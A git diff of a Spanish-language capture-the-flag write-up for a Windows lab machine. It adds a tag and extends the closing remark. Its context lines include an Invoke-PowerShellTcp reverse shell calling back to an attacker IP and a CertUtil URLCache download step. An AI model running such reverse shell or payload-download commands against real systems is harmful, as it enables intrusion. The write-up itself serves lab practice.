@@ -8,7 +8,7 @@
 - OS: Windows
 - Dificultad: Medium
 - IP: 10.10.11.241
-- Temas: ``File Upload``, ``Code Injection``, `Win Enumeration`.
+- Temas: ``File Upload``, ``Code Injection``, `Win Enumeration`, `linux PrivEsc`.
 ***
 - Comenzamos con un escaneo de puertos, al ser una máquina Windows es probable que veamos bastantes:
 
@@ -363,6 +363,8 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.34 -Port 6666
 
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/1629c207-44bc-44b8-86cc-4c4530bf144b)
 
+***
+
 <h3>PrivEsc:</h3>
 
 - Bien, probé enumerar distintos servicios que habían en el equipo pero no encontré nada, ni siquiera con herramientas como `mimikatz`.
@@ -439,4 +441,4 @@ CertUtil: -URLCache command completed successfully.
 
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/857f0a3a-c075-4c25-9af9-6d93cf9e4a03)
 
-- Y así concluimos esta máquina.
+- Y así concluimos esta máquina, bastante entretenida y muy util para practicar conceptos básicos e intermedios en un entorno dividido.
